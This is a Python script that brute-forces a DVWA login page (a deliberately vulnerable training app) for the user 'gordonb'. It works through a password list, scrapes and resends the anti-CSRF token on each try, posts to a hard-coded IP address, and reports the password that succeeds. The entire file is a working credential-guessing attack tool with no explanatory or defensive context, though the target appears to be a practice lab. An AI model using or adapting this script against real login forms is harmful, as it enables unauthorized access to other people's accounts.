#!/usr/bin/env python3
# coding: utf-8

import requests
import time
from pprint import pprint
from bs4 import BeautifulSoup


username = "gordonb"

passwords = open('mdp.txt', 'r')

session = requests.Session()

for password in passwords:
	time.sleep(0.200)
	password = password.replace('\n', '')
	
	print('password test: ', password)
	
	r = session.get('http://138.68.135.12/dvwa/login.php')

	if r.status_code == 200:
		soup = BeautifulSoup(r.text, 'html.parser')
		hidden_tags = soup.find("input", type="hidden")

		token = hidden_tags.get("value")

		data = {'username': username, 'password': password, 'Login': 'login', 'user_token': token}

		req = session.post('http://138.68.135.12/dvwa/login.php', data=data)

		if 'CSRF token is incorrect' in req.text:
			print('token invalide')

		if 'Login failed' not in req.text and 'CSRF token is incorrect' not in req.text:
			print('Le bon password est: ', password)
			exit()


